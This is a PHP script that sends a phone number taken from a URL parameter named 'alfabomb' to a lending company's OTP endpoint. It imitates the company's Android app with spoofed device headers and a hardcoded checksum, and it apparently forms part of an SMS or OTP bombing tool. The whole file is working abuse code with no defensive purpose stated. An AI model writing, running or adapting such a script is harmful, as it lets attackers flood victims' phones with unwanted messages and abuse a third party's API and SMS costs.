<?php

// Define the URL
$url = "https://api.stashfin.com/v2/api/";

// Define the phone number dynamically
$number = $_GET['alfabomb'];

// Define the data payload with the dynamic phone number
$data = http_build_query([
    "phone" => $number,
    "change_mobile_number" => "false",
    "mode" => "generate_otp",
    "checksum" => "68f04e4336cb344de3c2f30c7d8c6f600ab0035be446aa167bbc37b5350866ca"
]);

// Initialize cURL session
$ch = curl_init($url);

// Set cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/x-www-form-urlencoded",
    "Accept: application/json",
    "Request-Type: Android",
    "Device-Id: c7abc1fd7459e84c",
    "Device-Version: 293",
    "Version: v2",
    "User-Agent: okhttp/5.0.0-alpha.11"
]);

// Execute the request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
    echo 'cURL error: ' . curl_error($ch);
} else {
    // Print the response
    echo $response;
}

// Close the cURL session
curl_close($ch);
?>
